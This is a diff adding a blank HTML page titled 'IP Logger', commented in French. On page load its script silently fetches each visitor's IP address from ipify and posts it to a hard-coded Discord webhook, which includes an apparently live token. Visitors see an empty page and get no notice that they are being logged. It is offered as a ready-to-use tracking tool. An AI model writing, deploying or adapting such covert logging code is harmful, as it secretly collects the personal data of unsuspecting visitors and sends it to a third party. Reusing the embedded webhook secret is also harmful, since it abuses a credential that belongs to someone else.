@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+    <script>
+        // Fonction pour récupérer l'adresse IP du visiteur
+        function getIP(json) {
+            var ip = json.ip;
+            sendToWebhook(ip);
+        }
+
+        // Fonction pour envoyer l'IP à un webhook Discord
+        function sendToWebhook(ip) {
+            var webhookURL = "https://discord.com/api/webhooks/1235983870554276041/PvYmuBsm-MkW0Snfsw3Mzs4bqbgNGYDtBml6lcnhUT4rQCb0RECZvTUvy6ZJJoItHi71"; // Remplacez "WEBHOOK_URL" par votre propre URL de webhook Discord
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            var params = {
+                content: "Nouvelle visite sur le site ! IP @everyone : " + ip
+            };
+            
+            xhr.send(JSON.stringify(params));
+        }
+    </script>
+</head>
+<body onload="getIP()">
+</body>
+   <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</html>
